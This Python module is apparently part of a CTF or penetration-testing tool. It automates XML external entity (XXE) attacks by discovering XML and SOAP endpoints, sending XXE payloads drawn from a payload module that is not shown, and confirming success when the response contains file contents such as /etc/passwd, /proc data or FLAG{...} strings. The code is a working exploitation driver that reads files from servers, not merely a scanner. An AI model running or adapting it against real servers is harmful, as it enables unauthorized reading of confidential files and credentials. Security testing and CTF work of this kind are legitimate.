"""
XXE Detector - Core XXE vulnerability detection logic
"""
import re
import asyncio
import aiohttp
from typing import Dict, List, Optional, Tuple
from .xxe_payloads import (
    get_xxe_payload,
    get_all_flag_payloads,
    COMMON_FLAG_PATHS,
    COMMON_SENSITIVE_FILES,
    PAYLOAD_TEMPLATES,
    detect_xml_endpoint_type
)


class XXEDetector:
    """Detects XXE vulnerabilities in XML endpoints"""

    def __init__(self):
        self.timeout = 10
        self.headers = {
            'Content-Type': 'application/xml',
            'User-Agent': 'Mozilla/5.0'
        }

    async def test_endpoint(
        self,
        url: str,
        method: str = 'POST',
        baseline_xml: Optional[str] = None,
        auth_cookies: Optional[Dict] = None
    ) -> Dict:
        """
        Test an endpoint for XXE vulnerability

        Args:
            url: Target URL
            method: HTTP method
            baseline_xml: Original XML to modify
            auth_cookies: Authentication cookies

        Returns:
            Dict with results
        """
        results = {
            'vulnerable': False,
            'file_path': None,
            'file_content': None,
            'payload_type': None,
            'flag': None
        }

        # Detect endpoint type
        endpoint_type = detect_xml_endpoint_type(url, baseline_xml or "")

        # Select appropriate payload templates based on endpoint type
        if endpoint_type == "soap":
            payload_types = [
                "soap_envelope",
                "soap_cdata",
                "soap_login",
                "classic_xxe",
                "iso_encoding"
            ]
        else:
            payload_types = [
                "classic_xxe",
                "iso_encoding",
                "basic_file_read",
                "user_info",
                "generic_xml",
                "user_xml",
                "php_filter",
                "utf7_encoded"
            ]

        # Test flag locations first (priority)
        for payload_type in payload_types:
            for file_path, payload in get_all_flag_payloads(payload_type):
                result = await self._send_xxe_payload(
                    url, payload, method, auth_cookies
                )

                if result['success']:
                    # Check if we got file content
                    if result['response']:
                        # Look for FLAG pattern
                        flag_match = re.search(
                            r'FLAG\{[^}]+\}|flag\{[^}]+\}|CTF\{[^}]+\}',
                            result['response'],
                            re.IGNORECASE
                        )

                        if flag_match:
                            results['vulnerable'] = True
                            results['file_path'] = file_path
                            results['file_content'] = result['response']
                            results['payload_type'] = payload_type
                            results['flag'] = flag_match.group(0)
                            return results

                        # Check if we got actual file content (not error)
                        if self._looks_like_file_content(result['response'], file_path):
                            results['vulnerable'] = True
                            results['file_path'] = file_path
                            results['file_content'] = result['response']
                            results['payload_type'] = payload_type
                            return results

        # If no flag found, try common sensitive files for confirmation
        for payload_type in payload_types[:1]:  # Just use first type
            for file_path in COMMON_SENSITIVE_FILES[:3]:  # Test first 3
                payload = get_xxe_payload(file_path, payload_type)
                result = await self._send_xxe_payload(
                    url, payload, method, auth_cookies
                )

                if result['success'] and result['response']:
                    if self._looks_like_file_content(result['response'], file_path):
                        results['vulnerable'] = True
                        results['file_path'] = file_path
                        results['file_content'] = result['response'][:500]
                        results['payload_type'] = payload_type
                        return results

        return results

    async def _send_xxe_payload(
        self,
        url: str,
        payload: str,
        method: str,
        auth_cookies: Optional[Dict]
    ) -> Dict:
        """
        Send XXE payload to endpoint

        Returns:
            Dict with success status and response
        """
        try:
            async with aiohttp.ClientSession(cookies=auth_cookies) as session:
                if method.upper() == 'POST':
                    async with session.post(
                        url,
                        data=payload,
                        headers=self.headers,
                        timeout=aiohttp.ClientTimeout(total=self.timeout),
                        allow_redirects=True
                    ) as resp:
                        response_text = await resp.text()
                        return {
                            'success': True,
                            'status': resp.status,
                            'response': response_text
                        }
                elif method.upper() == 'PUT':
                    async with session.put(
                        url,
                        data=payload,
                        headers=self.headers,
                        timeout=aiohttp.ClientTimeout(total=self.timeout)
                    ) as resp:
                        response_text = await resp.text()
                        return {
                            'success': True,
                            'status': resp.status,
                            'response': response_text
                        }
                else:
                    return {'success': False, 'response': ''}

        except Exception as e:
            return {'success': False, 'error': str(e), 'response': ''}

    def _looks_like_file_content(self, response: str, file_path: str) -> bool:
        """
        Check if response looks like actual file content (not an error)

        Args:
            response: Server response
            file_path: Path we tried to read

        Returns:
            True if response contains file content
        """
        if not response or len(response) < 5:
            return False

        # IMPORTANT: Check for error messages FIRST before anything else

        # Check for JSON error responses (FastAPI, etc.)
        if response.strip().startswith('{') and ('error' in response.lower() or 'detail' in response.lower() or 'message' in response.lower()):
            return False

        # Check for HTML error pages
        if '<!doctype html>' in response.lower() or '<html' in response.lower():
            if any(err in response.lower() for err in [
                'method not allowed', '405', '404 not found', '500 internal server error',
                'bad request', 'forbidden', 'unauthorized'
            ]):
                return False

        error_patterns = [
            'not found',
            '404',
            '405',  # Method not allowed
            '500',
            'error',
            'exception',
            'invalid',
            'forbidden',
            'access denied',
            'unknown request',  # SOAP-specific error
            'bad request',
            'parse error',
            'malformed',
            'unauthorized',
            'field required',  # FastAPI validation
            'missing',  # FastAPI validation
            'method not allowed',  # HTTP 405
        ]

        response_lower = response.lower()
        if any(err in response_lower for err in error_patterns):
            return False

        # Check for /etc/passwd patterns
        if '/etc/passwd' in file_path:
            if re.search(r'root:[x\*]:0:0:', response):
                return True
            if 'daemon' in response or 'nobody' in response:
                return True

        # Check for /proc/ files
        if '/proc/' in file_path:
            if 'PATH=' in response or 'HOME=' in response:
                return True

        # Check for flag files
        if 'flag' in file_path.lower():
            # Any content in response is likely the flag
            if len(response.strip()) > 10:
                return True

        # Check for common file indicators
        if any(indicator in response for indicator in [
            '#!/',  # Shebang
            'import ',  # Python
            '<?php',  # PHP
            'root:',  # passwd
            'FLAG{', 'flag{', 'CTF{',  # Flags
        ]):
            return True

        # If we got substantial content (>20 chars), likely successful
        if len(response.strip()) > 20:
            return True

        return False

    async def discover_xml_endpoints(self, base_url: str, session) -> List[str]:
        """
        Discover potential XML endpoints

        Args:
            base_url: Base URL to scan
            session: aiohttp session

        Returns:
            List of potential XML endpoint URLs
        """
        xml_endpoints = []

        # Common XML/SOAP endpoint patterns
        patterns = [
            '/soap',
            '/api/soap',
            '/ws',
            '/webservice',
            '/service',
            '/services',
            '/api/xml',
            '/xmlrpc',
            '/xml',
        ]

        for pattern in patterns:
            url = base_url.rstrip('/') + pattern
            try:
                async with session.get(
                    url,
                    timeout=aiohttp.ClientTimeout(total=5),
                    allow_redirects=False
                ) as resp:
                    if resp.status in [200, 405, 500]:  # 405 = Method Not Allowed, might accept POST
                        xml_endpoints.append(url)
            except:
                pass

        return xml_endpoints
